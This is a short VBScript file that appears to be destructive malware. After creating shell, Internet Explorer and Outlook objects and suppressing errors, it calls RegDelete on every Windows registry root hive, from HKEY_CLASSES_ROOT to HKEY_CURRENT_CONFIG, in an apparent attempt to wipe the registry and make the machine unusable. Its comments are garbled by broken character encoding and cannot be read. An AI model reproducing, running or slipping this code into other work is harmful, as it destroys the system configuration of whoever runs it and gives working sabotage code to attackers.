Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' ������� ������ � �������
Shell.RegDelete "HKEY_CLASSES_ROOT"

' ������� ������ � �������
Shell.RegDelete "HKEY_CURRENT_USER"

' ������� ������ � �������
Shell.RegDelete "HKEY_LOCAL_MACHINE"

' ������� ������ � �������
Shell.RegDelete "HKEY_USERS"

' ������� ������ � �������
Shell.RegDelete "HKEY_CURRENT_CONFIG"

